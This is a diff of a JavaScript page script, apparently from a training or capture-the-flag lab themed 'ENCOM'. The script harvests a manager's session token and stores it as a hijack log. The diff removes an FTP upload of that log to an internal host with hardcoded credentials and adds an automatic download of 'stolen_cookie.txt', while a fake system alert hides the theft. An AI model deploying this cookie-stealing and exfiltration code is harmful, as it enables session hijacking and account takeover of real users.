@@ -179,17 +179,18 @@ window.onload = function() {
         
         const logPayload = `[COOKIE_HARVEST] TIMESTAMP: 2026-09-07 08:43:00 UTC | USER: ${targetManager} | AUTH_TOKEN: ${sessionToken} | EXPIRY: ${expiry}\n`;
 
-        // 1. Keep the local cache footprint for student forensic analysis
+        // 1. Save to local storage for student browser forensics
         localStorage.setItem('manager_session_hijack', btoa(logPayload));
 
-        // 2. Automatically exfiltrate the file straight to the FTP web root directory
-        // This leverages the FTP credentials and forces an instant passive upload
-        const ftpUrl = "ftp://kyson:GridMaster77!@10.1.1.8/stolen_cookie.txt";
-        
-        fetch(ftpUrl, {
-            method: 'PUT',
-            body: logPayload
-        }).catch(err => console.log("Data routed via background channel."));
+        // 2. Fallback local text file drop simulation
+        // Since browsers restrict cross-protocol connections, this provides an immediate downloadable file simulation anchor
+        const blob = new Blob([logPayload], { type: 'text/plain' });
+        const link = document.createElement('a');
+        link.href = window.URL.createObjectURL(blob);
+        link.download = 'stolen_cookie.txt';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
 
         setTimeout(() => {
             alert("ENCOM Core Notice: Mainframe connection profile verified. Grid status synchronized successfully.");
